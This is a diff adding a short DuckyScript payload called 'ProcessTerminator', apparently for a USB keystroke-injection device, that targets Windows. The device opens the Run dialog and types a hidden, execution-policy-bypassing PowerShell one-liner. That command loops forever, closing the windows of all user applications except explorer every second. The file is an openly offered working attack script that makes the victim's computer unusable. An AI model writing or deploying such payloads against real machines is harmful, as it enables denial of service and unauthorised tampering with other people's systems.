@@ -1,0 +1,10 @@
+REM Title: ProcessTerminator
+REM Author: dsymbol
+REM Description: Hidden PowerShell script that tirelessly hunts down user processes and terminates them
+REM Target: Windows
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass while(1) {$ws=gps|?{$_.MainWindowHandle-ne 0};foreach($w in $ws){if($w.ProcessName-ne'explorer'-and$w.Id-ne$PID){$w.CloseMainWindow()}}sleep -Seconds 1}
+ENTER
